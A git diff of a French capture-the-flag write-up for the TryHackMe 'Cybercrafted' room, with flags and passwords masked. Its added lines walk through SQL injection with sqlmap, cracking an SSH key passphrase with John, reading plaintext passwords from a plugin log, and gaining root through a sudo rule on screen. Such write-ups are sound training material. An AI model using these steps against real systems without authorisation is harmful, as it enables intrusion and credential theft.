@@ -133,7 +133,7 @@ Je n'ai rien trouver de bien foufou avec Gobuster, mais j'ai trouver avec Dirsea
 Task Completed
 ```
 # SQLi !
-On va jouer un peu avec SQLmap ici, d'habitude je m'entraine a les faires à la main, mais faut bien savoir aussi exploiter les outils existant !
+On va jouer un peu avec SQLmap ici.
 On va récupèrer la requête avec Burp Suite et lancer sqlmap
 ```
 sqlmap -r req.txt
@@ -154,15 +154,15 @@ Dans la database **webapp** on retrouve le flag et l'user :
 +----+------------------------------------------+---------------------+
 | id | hash                                     | user                |
 +----+------------------------------------------+---------------------+
-| 1  | 88b949dd5cdxxxxxxxxxxxxxxxxxxxxxxxxe7c01 | xXUltimateCreeperXx |
-| 4  | THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}    | web_flag            |
+| 1  | 88bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX1 | xXUltimateCreeperXx |
+| 4  | THM{bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX8}    | web_flag            |
 +----+------------------------------------------+---------------------+
 ```
 Le mot de passe est en SHA1.
 
 ```
 xXUltimateCreeperXx
-diaxxxxxxxxxxx89
+dXXXXXXXXXXXXXXX9
 ```
 # Admin panel & RCE!
 Nous avons désormais l'accès a l'admin panel. Celui-ci propose une page qui execute des commandes sur le serveur.
@@ -183,9 +183,7 @@ DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
 
 Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
 +Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
-fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
+XXXXXXXXXXXXXXX
 RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
 v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
 -----END RSA PRIVATE KEY-----
@@ -208,24 +206,72 @@ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
 Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-cxxxxxxxxxx2006      (id_rsa)     
+cXXXXXXXXXXXXXXX6      (id_rsa)     
 1g 0:00:00:00 DONE (2023-12-04 10:05) 2.173g/s 4121Kp/s 4121Kc/s 4121KC/s creepygoblin..creek93
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-Nous avons donc le mot de passe de la clé ssh: **cxxxxxxxxxx2006**
-Mais lors de la connexion SSH, il demande encore le mdp du compte....
+Nous avons donc le mot de passe de la clé ssh: **cXXXXXXXXXXXXXXX6**
+```
+root@kali: ssh -i id_rsa xxultimatecreeperxx@10.10.218.242
+Enter passphrase for key 'id_rsa': 
+xxultimatecreeperxx@cybercrafted:~$ 
+```
+# Lateral Mouvement:
+En regardant dans les tâches cron on vois qu'un script s'execute :
+```
+* *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*
+```
+Dans le dossier **/opt/minecraft** on retrouve une note :
+```
+Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
+- cybercrafted
 
-## Get the fking account !
-PAS FINI C'EST EN COURS DE REDACTION !
+P.S
+Will remove the whitelist soon.
+```
+Le flag:
+```
+THM{bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXe}
+```
+## Le plugin !
+On retrouve donc le plugin LoginSystem, en farfouillant dedans on retrouve cela :
+```
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
+cybercrafted: dcbXXXXXXXXXXXXXXXXXXXX9e
+madrinch: 42f7XXXXXXXXXXXXXXXXXXXXXXXX4cafcb
+```
+Mais aussi, et surtout, les logs !
+```
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt
+[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:25:16] cybercrafted registered. PW: JXXXXXXXXXXXXXk
+[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:47:34] cybercrafted logged in. PW: JXXXXXXXXXXXXXXk
+```
 
+On retrouve ici le compte de **cybercrafted** !
+# Privesc to root !
+On regarde les droits de **cybercrafted**
+```
+cybercrafted@cybercrafted:~$ sudo -l
+[sudo] password for cybercrafted: 
+Matching Defaults entries for cybercrafted on cybercrafted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-
-
-
-
-
-
+User cybercrafted may run the following commands on cybercrafted:
+    (root) /usr/bin/screen -r cybercrafted
+```
+On vois ici qu'il peux utiliser **screen** en tant que root.
+```
+cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
+```
+Ensuite, nous devons utilisez les raccourcis **CTRL+A** afin d'avoir le shell:
+```
+# id
+uid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)
+```
+Le flag ce trouve dans **/root/root.txt**
 
 # CHEAT MOD
 Décidement, cette vulnérabilité je l'aime d'amour, elle fonctionne partout !!
